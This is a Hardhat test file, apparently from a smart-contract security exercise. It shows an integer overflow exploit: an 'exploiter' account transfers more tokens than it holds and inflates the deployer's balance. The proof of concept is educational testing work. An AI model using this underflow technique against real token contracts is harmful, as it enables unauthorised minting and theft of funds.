
import { expect } from "chai";
import { BigNumber } from "ethers";
import { deployments,getNamedAccounts, ethers} from "hardhat";
import "hardhat-deploy-ethers";

describe("Token", async () =>{
    it("Should have overflow", async () =>{
        await deployments.fixture(["Token"])
        const {deployer,exploiter} = await getNamedAccounts();
        const exploiterAcc = await ethers.getSigner(exploiter);
        const tokenDeployment=await deployments.get('Token')
        
        const token = await ethers.getContractAt('Token',tokenDeployment.address)
        const originalBalance=await token.balanceOf(deployer)
        
        await token.connect(exploiterAcc).transfer(deployer,originalBalance.add(21))
        const newBalance=await token.balanceOf(deployer)
        console.log(`Old balance: ${(originalBalance as BigNumber).toNumber()}`)
        console.log(`New balance: ${(newBalance as BigNumber).toNumber()}`)
        expect(newBalance.gt(originalBalance),"Couldn't get more tokens").to.be.true
    });
});
